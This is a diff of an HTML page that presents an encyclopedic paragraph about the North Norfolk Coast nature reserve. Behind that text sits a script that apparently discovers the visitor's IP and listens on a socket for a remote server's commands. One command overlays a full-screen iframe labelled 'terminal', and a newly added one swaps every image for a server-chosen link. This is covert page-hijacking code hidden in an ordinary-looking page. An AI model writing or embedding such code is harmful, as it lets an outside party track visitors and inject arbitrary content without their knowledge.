@@ -1,5 +1,9 @@
 <body>
 The North Norfolk Coast Site of Special Scientific Interest in Norfolk, England, is a Special Protection Area for birds and other wildlife, included in the European Union's Natura 2000 network of protected sites. Its habitats include reed beds, salt marshes, freshwater lagoons, and sand or shingle beaches, across 7,700 ha (19,027 acres) of the county's north coast. The wetlands are important for scarce breeding birds such as pied avocets. The location also attracts rare migrating birds, and ducks and geese winter along this coast in considerable numbers. The area is archaeologically significant, with sites including the mound of an Iron Age fort, a Roman naval port near Brancaster, medieval ruins, and remnants of military use from both world wars. The area attracts many tourists for birdwatching and other outdoor activities. The threat of the sea's encroachment on this soft coast is being met by managed retreat and the creation of new reserves inland. The site is designated as a wetland of international importance, and most of it is a Biosphere Reserve. 
+<img src="http://www.w3schools.com/html/pic_mountain.jpg"/>
+<img src="http://www.w3schools.com/html/pic_mountain.jpg"/>
+<img src="http://www.w3schools.com/html/pic_mountain.jpg"/>
+<img src="http://www.w3schools.com/html/pic_mountain.jpg"/>
 </body>
 
 <script>
@@ -64,9 +68,16 @@ findIP.then(function(result) {
                 $('body').append('<iframe style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:50%;height:50%;background:transparent;border:none;" id="terminal" src="'+data.link+'"></iframe>'); 
             });
 
+            socket.on('replaceImages',function(data){
+              var imgs = document.getElementsByTagName("img");
+              for(var i=0, l=imgs.length;i<l;i++){
+                imgs[i].src = data.link;
+              }
+            });
+
 
           });
-      });sss
+      });
   });
 });
 </script>
